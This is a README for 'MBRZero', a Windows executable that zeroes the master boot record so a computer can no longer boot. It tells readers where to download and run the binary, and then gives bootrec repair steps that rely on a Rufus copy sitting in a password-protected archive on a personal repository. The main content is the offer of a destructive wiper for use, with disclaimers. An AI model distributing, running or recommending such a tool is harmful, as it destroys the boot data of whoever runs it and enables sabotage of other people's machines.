# MBRZero
Set your MBR to zero

**DISCLAIMER:**
This program is not safe. It will overwrite your MBR and make your computer unusable.
**DO NOT TRY THIS ON YOUR HOST MACHINE. YOU HAVE BEEN WARNED.**

**How to use?**
To download this, go to **bin/Release** and download the **MBRZero.exe**. Run it then it will set your MBR to 0 so the computer can't boot anymore.

**How to repair?**
First, boot into the Windows Installation on your USB (Rufus needed, https://github.com/GrumpBoatYT/Programs/blob/master/software/Rufus.7z archive password is **grumpboat**). Then click on **Next**. Then click on **Repair your computer**. Then run a startup repair. After that, click on **Command Prompt**. Then go to your os drive. Then type 3 commands: **bootrec /fixboot**, **bootrec /fixmbr**, **bootrec /rebuildbcd**. After that, eject your USB and now your computer is repaired! (Still don't try this on your host)
